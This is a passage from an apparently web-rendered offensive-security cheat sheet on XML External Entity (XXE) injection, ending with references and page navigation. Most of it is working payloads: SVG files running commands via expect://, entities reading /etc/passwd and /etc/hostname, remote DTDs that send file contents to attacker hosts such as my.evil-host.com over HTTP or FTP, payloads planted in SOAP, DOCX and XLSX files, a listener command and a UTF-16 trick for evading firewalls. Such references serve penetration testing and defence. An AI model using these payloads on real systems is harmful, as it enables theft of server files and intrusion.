+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">xmlns:xlink=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;300&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;200&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;image</span> <span style="color:#a6e22e">xlink:href=</span><span style="color:#e6db74">&#34;expect://ls&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;200&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;200&#34;</span><span style="color:#f92672">&gt;&lt;/image&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/svg&gt;</span>
+</span></span></code></pre></div><p><strong>Classic</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt;</span> ]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;128px&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;128px&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">xmlns:xlink=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;text</span> <span style="color:#a6e22e">font-size=</span><span style="color:#e6db74">&#34;16&#34;</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;16&#34;</span><span style="color:#f92672">&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/text&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/svg&gt;</span>
+</span></span></code></pre></div><p><strong>OOB via SVG rasterization</strong></p>
+<p><em>xxe.svg</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE svg [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ELEMENT svg ANY &gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % sp SYSTEM &#34;http://example.org:8080/xxe.xml&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>%sp;
+</span></span><span style="display:flex;"><span>%param1;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">viewBox=</span><span style="color:#e6db74">&#34;0 0 200 200&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.2&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">style=</span><span style="color:#e6db74">&#34;fill:red&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;text</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;15&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;100&#34;</span> <span style="color:#a6e22e">style=</span><span style="color:#e6db74">&#34;fill:black&#34;</span><span style="color:#f92672">&gt;</span>XXE via SVG rasterization<span style="color:#f92672">&lt;/text&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;rect</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">rx=</span><span style="color:#e6db74">&#34;10&#34;</span> <span style="color:#a6e22e">ry=</span><span style="color:#e6db74">&#34;10&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;200&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;200&#34;</span> <span style="color:#a6e22e">style=</span><span style="color:#e6db74">&#34;fill:pink;opacity:0.7&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;flowRoot</span> <span style="color:#a6e22e">font-size=</span><span style="color:#e6db74">&#34;15&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&lt;flowRegion&gt;</span>
+</span></span><span style="display:flex;"><span>           <span style="color:#f92672">&lt;rect</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;200&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;200&#34;</span> <span style="color:#a6e22e">style=</span><span style="color:#e6db74">&#34;fill:red;opacity:0.3&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&lt;/flowRegion&gt;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&lt;flowDiv&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;flowPara&gt;</span>&amp;exfil;<span style="color:#f92672">&lt;/flowPara&gt;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&lt;/flowDiv&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/flowRoot&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/svg&gt;</span>
+</span></span></code></pre></div><p><em>xxe.xml</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % data SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/hostname&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % param1 &#34;&lt;!ENTITY exfil SYSTEM &#39;ftp://example.org:2121/%data;&#39;&gt;</span>&#34;&gt;
+</span></span></code></pre></div><h3 id="xxe-inside-soap">
+  XXE inside SOAP
+  <a class="anchor" href="#xxe-inside-soap">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;soap:Body&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;foo&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &#34;http://x.x.x.x:22/&#34;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/soap:Body&gt;</span>
+</span></span></code></pre></div><h3 id="xxe-inside-docx-file">
+  XXE inside DOCX file
+  <a class="anchor" href="#xxe-inside-docx-file">#</a>
+</h3>
+<p>Format of an Open XML file (inject the payload in any .xml file):</p>
+<ul>
+<li>/_rels/.rels</li>
+<li>[Content_Types].xml</li>
+<li>Default Main Document Part
+<ul>
+<li>/word/document.xml</li>
+<li>/ppt/presentation.xml</li>
+<li>/xl/workbook.xml</li>
+</ul>
+</li>
+</ul>
+<p>Then update the file <code>zip -u xxe.docx [Content_Types].xml</code></p>
+<p>Tool : 
+  <a href="https://github.com/BuffaloWill/oxml_xxe">https://github.com/BuffaloWill/oxml_xxe</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>DOCX/XLSX/PPTX
+</span></span><span style="display:flex;"><span>ODT/ODG/ODP/ODS
+</span></span><span style="display:flex;"><span>SVG
+</span></span><span style="display:flex;"><span>XML
+</span></span><span style="display:flex;"><span>PDF (experimental)
+</span></span><span style="display:flex;"><span>JPG (experimental)
+</span></span><span style="display:flex;"><span>GIF (experimental)
+</span></span></code></pre></div><h3 id="xxe-inside-xlsx-file">
+  XXE inside XLSX file
+  <a class="anchor" href="#xxe-inside-xlsx-file">#</a>
+</h3>
+<p>Structure of the XLSX:</p>
+<pre tabindex="0"><code>$ 7z l xxe.xlsx
+[...]
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2021-10-17 15:19:00 .....          578          223  _rels/.rels
+2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
+2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
+2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
+2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
+2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
+2021-10-17 15:19:00 .....          731          352  docProps/core.xml
+2021-10-17 15:19:00 .....          410          246  docProps/app.xml
+2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
+------------------- ----- ------------ ------------  ------------------------
+2021-10-17 15:19:00              11216         3586  9 files
+</code></pre><p>Extract Excel file: <code>7z x -oXXE xxe.xlsx</code></p>
+<p>Rebuild Excel file:</p>
+<pre tabindex="0"><code>$ cd XXE
+$ 7z u ../xxe.xlsx *
+</code></pre><p>Add your blind XXE payload inside <code>xl/workbook.xml</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE cdl [&lt;!ELEMENT cdl ANY &gt;&lt;!ENTITY % asd SYSTEM &#34;http://x.x.x.x:8000/xxe.dtd&#34;&gt;</span>%asd;%c;]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;cdl&gt;</span>&amp;rrr;<span style="color:#f92672">&lt;/cdl&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;workbook</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/spreadsheetml/2006/main&#34;</span> <span style="color:#a6e22e">xmlns:r=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Alternativly, add your payload in <code>xl/sharedStrings.xml</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE cdl [&lt;!ELEMENT t ANY &gt;&lt;!ENTITY % asd SYSTEM &#34;http://x.x.x.x:8000/xxe.dtd&#34;&gt;</span>%asd;%c;]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;sst</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/spreadsheetml/2006/main&#34;</span> <span style="color:#a6e22e">count=</span><span style="color:#e6db74">&#34;10&#34;</span> <span style="color:#a6e22e">uniqueCount=</span><span style="color:#e6db74">&#34;10&#34;</span><span style="color:#f92672">&gt;&lt;si&gt;&lt;t&gt;</span>&amp;rrr;<span style="color:#f92672">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA2<span style="color:#f92672">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA3<span style="color:#f92672">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA4<span style="color:#f92672">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA5<span style="color:#f92672">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB1<span style="color:#f92672">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB2<span style="color:#f92672">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB3<span style="color:#f92672">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB4<span style="color:#f92672">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB5<span style="color:#f92672">&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;</span>
+</span></span></code></pre></div><p>Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file.
+Instead we build the document once and then change the DTD.
+And using FTP instead of HTTP allows to retrieve much larger files.</p>
+<p><code>xxe.dtd</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % d SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % c &#34;&lt;!ENTITY rrr SYSTEM &#39;ftp://x.x.x.x:2121/%d;&#39;&gt;</span>&#34;&gt; 
+</span></span></code></pre></div><p>Serve DTD and receive FTP payload using 
+  <a href="https://github.com/staaldraad/xxeserv">xxeserv</a>:</p>
+<pre tabindex="0"><code>$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
+</code></pre><h3 id="xxe-inside-dtd-file">
+  XXE inside DTD file
+  <a class="anchor" href="#xxe-inside-dtd-file">#</a>
+</h3>
+<p>Most XXE payloads detailed above require control over both the DTD or <code>DOCTYPE</code> block as well as the <code>xml</code> file.
+In rare situations, you may only control the DTD file and won&rsquo;t be able to modify the <code>xml</code> file. For example, a MITM.
+When all you control is the DTD file, and you do not control the <code>xml</code> file, XXE may still be possible with this payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Load the contents of a sensitive file into a variable --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % payload SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Use that variable to construct an HTTP get request with the file contents in the URL --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % param1 &#39;&lt;!ENTITY &amp;#37; external SYSTEM &#34;http://my.evil-host.com/x=%payload;&#34;&gt;</span>&#39;&gt;
+</span></span><span style="display:flex;"><span>%param1;
+</span></span><span style="display:flex;"><span>%external;
+</span></span></code></pre></div><h3 id="xxe-waf-bypass-via-convert-character-encoding">
+  XXE WAF Bypass via convert character encoding
+  <a class="anchor" href="#xxe-waf-bypass-via-convert-character-encoding">#</a>
+</h3>
+<p>In XXE WAFs, DTD Prolog are usually blacklisted BUT not all WAFs blacklist the UTF-16 character encoding<br><br>
+<code>All XML processors must accept the UTF-8 and UTF-16 encodings of Unicode</code>
+&ndash; 
+  <a href="https://www.w3.org/XML/xml-V10-4e-errata#E11">https://www.w3.org/XML/xml-V10-4e-errata#E11</a>
+<br><br>
+we can convert the character encoding to <code>UTF-16</code> using 
+  <a href="https://man7.org/linux/man-pages/man1/iconv.1.html">iconv</a> to bypass the XXE WAF:-<br></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE &gt; utf16exploit.xml
+</span></span></code></pre></div><h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing">XML External Entity (XXE) Processing - OWASP</a></li>
+<li>
+  <a href="http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html">Detecting and exploiting XXE in SAML Interfaces</a> - 6. Nov. 2014 - Von Christian Mainka</li>
+<li>
+  <a href="https://gist.github.com/staaldraad/01415b990939494879b4">[Gist] staaldraad - XXE payloads</a></li>
+<li>
+  <a href="https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870">[Gist] mgeeky - XML attacks</a></li>
+<li>
+  <a href="https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf">Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @<em>will_is</em></a></li>
+<li>
+  <a href="http://en.hackdig.com/08/28075.htm">XXE ALL THE THINGS!!! (including Apple iOS&rsquo;s Office Viewer)</a></li>
+<li>
+  <a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/">From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele</a></li>
+<li>
+  <a href="https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/">How we got read access on Google’s production servers</a> April 11, 2014 by  detectify</li>
+<li>
+  <a href="http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html">Blind OOB XXE At UBER 26+ Domains Hacked</a> August 05, 2016 by Raghav Bisht</li>
+<li>
+  <a href="https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf">OOB XXE through SAML</a> by Sean	Melia @seanmeals</li>
+<li>
+  <a href="https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html">XXE in Uber to read local files</a> 01/2017</li>
+<li>
+  <a href="https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/">XXE inside SVG</a> JUNE 22, 2016 by YEO QUAN YANG</li>
+<li>
+  <a href="https://phonexicum.github.io/infosec/xxe.html">Pentest XXE - @phonexicum</a></li>
+<li>
+  <a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">Exploiting XXE with local DTD files</a> - 12/12/2018 - Arseniy Sharoglazov</li>
+<li>
+  <a href="https://portswigger.net/web-security/xxe">Web Security Academy &raquo; XML external entity (XXE) injection - 2019 PortSwigger Ltd</a></li>
+<li>
+  <a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation">Automating local DTD discovery for XXE exploitation</a> - July 16 2019 by Philippe Arteau</li>
+<li>
+  <a href="https://www.4armed.com/blog/exploiting-xxe-with-excel/">EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN</a></li>
+<li>
+  <a href="https://github.com/jmcnamara/excel-reader-xlsx/issues/10">excel-reader-xlsx #10</a></li>
+<li>
+  <a href="https://jbz.team/midnightsunctfquals2019/Rubenscube">Midnight Sun CTF 2019 Quals - Rubenscube</a></li>
+<li>
+  <a href="https://www.synack.com/blog/a-deep-dive-into-xxe-injection/">SynAck - A Deep Dive into XXE Injection</a> - 22 July 2019 - Trenton Gordon</li>
+<li>
+  <a href="https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf">Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server</a> - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK</li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/xxe_injection.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#xml-external-entity">XML External Entity</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#detect-the-vulnerability">Detect the vulnerability</a></li>
+        <li><a href="#exploiting-xxe-to-retrieve-files">Exploiting XXE to retrieve files</a>
+          <ul>
+            <li><a href="#classic-xxe">Classic XXE</a></li>
+            <li><a href="#classic-xxe-base64-encoded">Classic XXE Base64 encoded</a></li>
+            <li><a href="#php-wrapper-inside-xxe">PHP Wrapper inside XXE</a></li>
+            <li><a href="#xinclude-attacks">XInclude attacks</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploiting-xxe-to-perform-ssrf-attacks">Exploiting XXE to perform SSRF attacks</a></li>
+        <li><a href="#exploiting-xxe-to-perform-a-deny-of-service">Exploiting XXE to perform a deny of service</a>
+          <ul>
+            <li><a href="#billion-laugh-attack">Billion Laugh Attack</a></li>
+            <li><a href="#yaml-attack">Yaml attack</a></li>
+          </ul>
+        </li>
+        <li><a href="#error-based-xxe">Error Based XXE</a></li>
+        <li><a href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band">Exploiting blind XXE to exfiltrate data out-of-band</a>
+          <ul>
+            <li><a href="#blind-xxe">Blind XXE</a></li>
+            <li><a href="#xxe-oob-attack-yunusov-2013">XXE OOB Attack (Yunusov, 2013)</a></li>
+            <li><a href="#xxe-oob-with-dtd-and-php-filter">XXE OOB with DTD and PHP filter</a></li>
+            <li><a href="#xxe-oob-with-apache-karaf">XXE OOB with Apache Karaf</a></li>
+          </ul>
+        </li>
+        <li><a href="#xxe-with-local-dtd">XXE with local DTD</a></li>
+        <li><a href="#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents">Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents</a>
+          <ul>
+            <li><a href="#disclose-local-file">Disclose local file</a></li>
+            <li><a href="#disclose-http-response">Disclose HTTP Response:</a></li>
+          </ul>
+        </li>
+        <li><a href="#xxe-in-exotic-files">XXE in exotic files</a>
+          <ul>
+            <li><a href="#xxe-inside-svg">XXE inside SVG</a></li>
+            <li><a href="#xxe-inside-soap">XXE inside SOAP</a></li>
+            <li><a href="#xxe-inside-docx-file">XXE inside DOCX file</a></li>
+            <li><a href="#xxe-inside-xlsx-file">XXE inside XLSX file</a></li>
+            <li><a href="#xxe-inside-dtd-file">XXE inside DTD file</a></li>
+            <li><a href="#xxe-waf-bypass-via-convert-character-encoding">XXE WAF Bypass via convert character encoding</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
